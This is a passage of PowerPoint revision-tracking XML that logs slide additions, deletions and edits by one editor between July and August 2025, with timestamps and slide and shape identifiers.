      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:23.321" v="1323" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="958426234" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:38:37.886" v="1073" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1653228231" sldId="417"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:38:37.886" v="1073" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="574555631" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:21.904" v="1322" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1293863796" sldId="419"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:38:37.886" v="1073" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1118759039" sldId="420"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:38:40.827" v="1074" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2909304318" sldId="421"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3065586434" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1463157231" sldId="423"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2568305707" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3747966714" sldId="425"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3966948570" sldId="426"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3392931056" sldId="427"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="70765890" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1988594508" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:38:26.739" v="1072" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1305988210" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2158398531" sldId="431"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2733904292" sldId="432"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2494709287" sldId="433"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1112806581" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2994432945" sldId="435"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="687874099" sldId="436"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1424753074" sldId="437"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1715348504" sldId="438"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1446343864" sldId="439"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2713408755" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2494932483" sldId="441"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:37:25.550" v="1069" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3523717158" sldId="442"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-31T05:07:15.157" v="59" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3618621976" sldId="443"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T08:02:03.312" v="318" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="129883077" sldId="444"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T08:09:14.490" v="427" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2093535079" sldId="445"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T08:11:29.531" v="430" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="856833930" sldId="446"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T05:02:37.821" v="444" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1169922151" sldId="447"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod modNotes modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-08T09:25:02.040" v="537" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="650663545" sldId="448"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T05:25:57.818" v="465" actId="404"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="941866300" sldId="449"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new del mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:54:46.334" v="481" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2094821593" sldId="450"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:13:12.636" v="491" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2377318329" sldId="450"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp new del mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:13:21.349" v="494" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1173469177" sldId="451"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:13:35.356" v="498" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3272928075" sldId="451"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:24:09.801" v="507" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="350808215" sldId="452"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp new mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:26:37.208" v="517" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3661045527" sldId="453"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:26:46.149" v="520" actId="120"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2393632207" sldId="454"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:27:37.005" v="526" actId="120"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="419700389" sldId="455"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:27:53.487" v="529" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2382683616" sldId="456"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T08:28:06.136" v="533" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2650988497" sldId="456"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-19T02:52:24.201" v="759" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="338983684" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-08T09:17:12.432" v="535" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="797699991" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-14T05:05:44.746" v="567" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="952735441" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-20T09:05:13.027" v="784" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2292282364" sldId="458"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-19T02:56:12.387" v="783"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1281342903" sldId="459"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-20T09:12:05.736" v="808" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2903745883" sldId="460"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-20T09:13:19.087" v="824" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="274668141" sldId="461"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-20T09:14:51.118" v="831"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="412488489" sldId="462"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-26T02:39:02.865" v="1134" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="567881437" sldId="463"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T04:53:11.148" v="840" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="567881437" sldId="463"/>
            <ac:spMk id="2" creationId="{A18138F4-558E-81BF-DB49-9A599A8E50EB}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-26T02:37:04.078" v="1133" actId="403"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="567881437" sldId="463"/>
            <ac:spMk id="3" creationId="{DE5F15AF-A9D8-E64A-EAB9-1E8E6A31A824}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:17:47.496" v="988" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="77435757" sldId="464"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:06:09.414" v="903"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="77435757" sldId="464"/>
            <ac:spMk id="2" creationId="{BB442764-10D0-12FF-905C-D6200F9E78E9}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:17:47.496" v="988" actId="14100"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="77435757" sldId="464"/>
            <ac:spMk id="3" creationId="{F169DC28-6E2A-F245-EC94-F6E529348445}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:22:12.032" v="1031" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2341799495" sldId="465"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:18:46.484" v="992" actId="404"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2341799495" sldId="465"/>
            <ac:spMk id="2" creationId="{50F60E26-6372-9EBE-8BAE-B693D74140A0}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:22:12.032" v="1031" actId="14100"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2341799495" sldId="465"/>
            <ac:spMk id="3" creationId="{976B302F-0442-858D-F5DF-C7E93971BBFA}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:32:35.419" v="1062" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4234247082" sldId="466"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:31:06.110" v="1050"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4234247082" sldId="466"/>
            <ac:spMk id="2" creationId="{A816B355-5CD9-F8BF-9DEB-DA2E15D58098}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:32:35.419" v="1062" actId="403"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4234247082" sldId="466"/>
            <ac:spMk id="3" creationId="{D676D7CA-ED57-6B18-C255-9C709316FC68}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-26T02:41:45.505" v="1139" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1003672107" sldId="467"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:46:44.254" v="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1003672107" sldId="467"/>
            <ac:spMk id="2" creationId="{D56EE464-7A06-2888-5FF0-0A865C047657}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-26T02:41:45.505" v="1139" actId="113"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1003672107" sldId="467"/>
            <ac:spMk id="3" creationId="{CB03EAC7-518E-4437-46CE-C10401E8AD32}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:08:41.161" v="1366" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="271817827" sldId="468"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:08:41.161" v="1366" actId="14100"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="271817827" sldId="468"/>
            <ac:spMk id="3" creationId="{FC7B130D-F4C5-B1A2-3987-3C93F79C1364}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod ord">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:10:21.464" v="1380" actId="207"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1495689909" sldId="469"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:10:21.464" v="1380" actId="207"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1495689909" sldId="469"/>
            <ac:spMk id="3" creationId="{7F9AE7CC-59FE-9CC3-AB5F-886C14D57AEB}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new del mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T09:37:08.506" v="1185" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="201142698" sldId="470"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T06:03:36.645" v="1119" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1635076999" sldId="470"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:10:05.384" v="1378" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
